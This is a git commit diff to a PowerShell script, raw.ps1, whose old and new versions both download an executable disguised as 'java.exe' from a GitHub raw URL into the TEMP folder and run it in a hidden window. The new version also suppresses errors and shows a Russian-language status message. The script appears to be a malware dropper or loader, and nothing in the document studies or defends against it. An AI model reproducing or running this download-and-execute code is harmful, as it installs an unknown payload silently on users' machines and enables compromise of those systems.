4824c5b04eda02e33eaf621ffe08f375eaf2da8d
artla <129896279+3465h@users.noreply.github.com>
2026-04-09 16:00:00 +0300

    Update raw.ps1

--- raw.ps1
+++ raw.ps1
@@ -1,6 +1,16 @@
-$u="https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe";
-$p="$env:temp\java.exe";
-curl.exe -L $u -o $p;
-saps $p -WindowStyle Hidden;
-Add-Type -AssemblyName Microsoft.VisualBasic;
-[Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
+$ErrorActionPreference = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+$url = "https://github.com/3465h/idkkkk/raw/refs/heads/main/java.exe"
+$path = Join-Path $env:TEMP "java.exe"
+
+# Качаем через встроенный метод, это надежнее чем curl в пайпе
+Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing
+
+if (Test-Path $path) {
+    Start-Process $path -WindowStyle Hidden
+    
+    # Чтобы не было ошибок с типами в iex
+    Add-Type -AssemblyName Microsoft.VisualBasic
+    [Microsoft.VisualBasic.Interaction]::MsgBox("Файл успешно запущен из Temp!", "OKOnly,Information", "Статус")
+}
